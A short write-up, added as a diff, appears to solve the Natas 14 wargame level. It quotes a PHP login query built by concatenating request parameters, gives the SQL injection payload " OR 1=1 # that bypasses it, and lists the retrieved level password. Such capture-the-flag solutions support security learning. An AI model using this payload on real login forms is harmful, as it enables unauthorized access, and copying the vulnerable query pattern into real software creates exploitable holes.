@@ -1,0 +1,13 @@
+Simple SQL injection, from the sourcecode, we can see the query:
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and
+password=\"".$_REQUEST["password"]."\"";
+
+SELECT * from users where username="" and password=""
+
+all we need to do is to enter:
+" OR 1=1 #
+=> SELECT * from users where username="" OR TRUE #
+
+flag retrieved: Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+
